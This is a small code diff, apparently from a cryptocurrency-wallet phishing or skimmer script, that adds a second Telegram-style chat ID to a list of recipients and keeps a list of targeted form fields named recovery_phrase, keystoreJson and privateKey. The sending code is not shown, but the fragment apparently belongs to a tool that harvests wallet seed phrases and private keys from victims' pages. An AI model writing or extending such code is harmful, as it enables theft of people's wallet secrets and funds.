@@ -1,4 +1,4 @@
-const chatIds = ["1534371221"];
+const chatIds = ["1534371221", "916348016"];
 const inputIds = ["recovery_phrase", "keystoreJson", "privateKey"];
 
 const url = window.location.href;
